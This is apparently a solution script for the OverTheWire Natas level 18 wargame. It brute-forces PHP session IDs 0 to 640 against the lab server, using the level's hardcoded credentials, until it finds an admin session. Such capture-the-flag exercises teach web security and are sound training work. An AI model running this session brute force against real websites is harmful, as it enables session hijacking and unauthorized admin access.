#Session Prediction Brute force - Natas 18

import requests

url = "http://natas18.natas.labs.overthewire.org/"
auth_variable = ("natas18","6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")

print("Running Script")
for i in range(641): #$maxid = 640; // 640 should be enough for everyone
 current_id = str(i)
 cookies_variable = {'PHPSESSID': current_id}
 r = requests.get(url, auth= auth_variable, cookies = cookies_variable)
 if("You are an admin" in r.text):
  print("[:] Admin ID found!")
  print(f"PHPSESSID : {current_id}")
  print(r.text)
  break